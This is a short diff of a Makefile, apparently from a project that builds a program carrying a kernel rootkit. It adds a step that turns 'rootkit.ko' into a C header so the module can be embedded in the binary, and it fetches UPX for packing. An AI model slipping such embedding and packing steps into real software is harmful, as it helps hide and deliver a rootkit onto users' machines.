@@ -104,6 +104,7 @@ $(NAME): modules $(OBJS) Makefile
 
 modules:
 	$(MAKE) -C ./srcs/modules/
+	xxd -i srcs/modules/rootkit.ko > includes/rootkit.h
 
 $(UPX_EXECUTABLE): 
 	wget https://github.com/upx/upx/releases/download/v$(UPX_VERSION)/upx-$(UPX_VERSION)-amd64_linux.tar.xz
